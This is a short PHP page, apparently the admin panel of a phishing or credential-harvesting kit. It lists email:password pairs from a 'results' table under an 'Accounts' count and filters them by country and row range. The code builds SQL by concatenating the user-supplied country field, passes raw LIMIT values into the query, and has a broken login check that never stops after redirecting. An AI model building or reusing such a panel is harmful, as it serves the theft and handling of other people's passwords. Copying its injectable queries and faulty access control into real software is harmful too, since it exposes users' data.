<form action="re.php" method="POST">
		<input type="number" name="start" placeholder="Start">
		<input type="number" name="end" placeholder="End">
        <input type="text" name="dawla" placeholder="Country">
		<input type="submit" value="Show">
	</form>


<a href="logout.php">Logout</a><br><br>
<?php 

	
    session_start();

	if(!isset($_SESSION['username']) AND $_SESSION["username"] != 'root'){

		header("Location: login.php");
	} 
    
	include 'connect.php';

	$all1 = $con->prepare("SELECT * FROM results");
	$all1->execute();
	$AllResults = $all1->fetchAll();

	$start = 0;
	$end = 1000;

	if($_SERVER["REQUEST_METHOD"] == "POST") {
		
		
		if(empty($_POST['start']) AND empty($_POST['end'])) {

			$start = 0;
			$end = count($AllResults);

		}elseif(empty($_POST['start']) AND $_POST['start'] != '0'){
			$stat = 0;
						
		}elseif(empty($_POST['end']) AND $_POST['end'] != '0'){

			$start = 1000;

		}else {

			$start = $_POST['start'];
			$end = $_POST['end'];
		}

        if(empty($_POST['dawla'])){
             $dawla = '';
        }else{
            $dawla = "WHERE country = '" . $_POST['dawla'] . "'";
        }
		
	}

	
	
	$stmt = $con->prepare("SELECT * FROM results $dawla ORDER BY `date` DESC LIMIT $start, $end");
	$stmt->execute();
	$results = $stmt->fetchAll();

	

		echo '==== ' . count($AllResults) . ' Accounts ====' . '<br>' ;
		echo '==== ' . count($results) . ' Shown ====' . '<br><br>' ;
		
	foreach($results as $result) {

		echo $result['email'] . ':' . $result['password'] . '<br>';
	}

?>			